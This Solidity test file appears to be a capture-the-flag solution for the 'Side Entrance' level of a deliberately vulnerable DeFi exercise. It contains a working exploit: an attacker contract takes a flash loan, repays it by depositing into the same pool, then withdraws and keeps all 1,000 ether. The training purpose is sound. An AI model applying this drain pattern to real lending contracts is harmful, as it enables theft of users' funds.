// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    Attacker_FlashLoanReceiver public attacker_sc;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        attacker_sc = new Attacker_FlashLoanReceiver(
            address(sideEntranceLenderPool)
        );
        vm.label(address(attacker_sc), "attacker_sc");
        vm.startPrank(address(attacker_sc));
        sideEntranceLenderPool.flashLoan(1000 ether);
        sideEntranceLenderPool.withdraw();
        attacker.transfer(1000 ether);
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract Attacker_FlashLoanReceiver {
    SideEntranceLenderPool internal sideEntranceLenderPool;

    constructor(address _sideEntranceLenderPool) {
        sideEntranceLenderPool = SideEntranceLenderPool(
            _sideEntranceLenderPool
        );
    }

    function execute() external payable {
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
